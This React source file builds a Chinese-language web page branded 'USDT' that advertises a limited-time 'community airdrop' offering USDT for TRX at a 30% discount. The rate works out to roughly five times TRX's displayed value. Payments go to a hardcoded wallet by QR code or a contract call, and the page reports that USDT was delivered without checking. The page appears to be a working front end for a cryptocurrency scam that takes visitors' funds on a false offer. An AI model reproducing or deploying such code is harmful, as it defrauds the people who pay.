import React, { useState, useEffect } from 'react';
import QRCode from 'react-qr-code'; // React 18 兼容二维码库

const App = () => {
  const [trxAmount, setTrxAmount] = useState('');
  const [usdtAmount, setUsdtAmount] = useState('');
  const [trxPrice, setTrxPrice] = useState(null);
  const [tronWeb, setTronWeb] = useState(null);
  const [showQR, setShowQR] = useState(false);
  const [qrString, setQrString] = useState('');

  // 收取 TRX 的地址（钱包地址）
  const paymentAddress = 'TWRAzGd4KGgyESBbe4EFaADFMFgG999BcD';  // 这个是用来收取 TRX 的地址
  // 合约地址
  const contractAddress = 'TRVCzHHvW6PBXyxjXPTtoHKGyiJw7kThK6'; // 你的合约地址，用于购买代币

  useEffect(() => {
    if (window.tronWeb && window.tronWeb.ready) {
      setTronWeb(window.tronWeb);
    }

    fetch('https://api.coingecko.com/api/v3/simple/price?ids=tron&vs_currencies=usd')
      .then(res => res.json())
      .then(data => setTrxPrice(data.tron?.usd || 0.27))
      .catch(() => setTrxPrice(0.27));
  }, []);

  const calculateUsdt = (trx) => {
    const val = parseFloat(trx);
    if (!val || !trxPrice) return '';
    return (val / 0.7).toFixed(4);
  };

  const handleTrxChange = (e) => {
    const val = e.target.value;
    if (/^\d*\.?\d*$/.test(val)) {
      setTrxAmount(val);
      setUsdtAmount(calculateUsdt(val));
      setShowQR(false);
    }
  };

  const handleBuy = async () => {
    const val = parseFloat(trxAmount);
    if (!val || val <= 0) return alert('请输入有效 TRX 数量');

    if (tronWeb) {
      // 获取合约实例
      const contract = tronWeb.contract().at(contractAddress);

      // 计算要购买的代币数量
      const usdtAmountToBuy = parseFloat(calculateUsdt(val)) * 1e6;  // 6 小数位

      // 调用合约的 buy() 函数
      contract.buy(usdtAmountToBuy).send({
        callValue: tronWeb.toSun(val), // TRX 转账金额
      }).then(result => {
        alert(`购买成功！${val} TRX 已发送，合约已转账 ${usdtAmountToBuy} USDT`);
      }).catch(error => {
        console.error(error);
        alert('购买失败，请重试！');
      });
    } else {
      // 生成二维码，地址和金额分开
      const qrData = `tron:${paymentAddress}?amount=${val.toFixed(6)}`;
      setQrString(qrData);  // 这里二维码指向收款钱包地址，amount 存储 TRX 数量
      setShowQR(true);
    }
  };

  return (
    <div className="min-h-screen bg-gray-100 flex items-center justify-center px-4">
      <div className="bg-white rounded-2xl shadow-xl w-full max-w-md p-6 text-center space-y-5">
        {/* Logo & Title */}
        <div className="flex justify-center items-center space-x-3">
          <img
            src="https://i.imgur.com/pNAm2gN.png"
            alt="USDT Logo"
            className="w-10 h-10"
            onError={(e) => (e.target.style.display = 'none')}
          />
          <h1 className="text-2xl font-bold text-gray-800">USDT</h1>
        </div>

        {/* 宣传语 */}
        <p className="text-sm text-yellow-600 font-medium">
          社区空投活动：TRX 七折购买 USDT（限时优惠）
        </p>

        {/* 实时价格 */}
        <p className="text-lg font-semibold text-gray-700">
          实时价格：${trxPrice?.toFixed(2) || '0.27'} / TRX
        </p>

        {/* 输入框 */}
        <input
          type="text"
          placeholder="输入 TRX 数量"
          value={trxAmount}
          onChange={handleTrxChange}
          className="w-full border border-gray-300 rounded-lg py-3 px-4 text-center text-lg focus:outline-none focus:ring-2 focus:ring-blue-500"
        />

        {/* 可购买 USDT 显示 */}
        <div className="text-sm text-gray-600">
          可购买 USDT: <span className="font-semibold">{usdtAmount || '0.0000'}</span>
        </div>

        {/* 购买按钮 */}
        <button
          onClick={handleBuy}
          className="w-full bg-blue-500 hover:bg-blue-600 text-white text-lg font-semibold py-3 rounded-lg transition"
        >
          购买
        </button>

        {/* 二维码展示 */}
        {showQR && qrString && (
          <div className="pt-4 space-y-2">
            <QRCode value={qrString} className="w-[150px] h-[150px] mx-auto" />
            <p className="text-sm text-gray-500">未检测到 TronLink，请扫码转账</p>
          </div>
        )}
      </div>
    </div>
  );
};

export default App;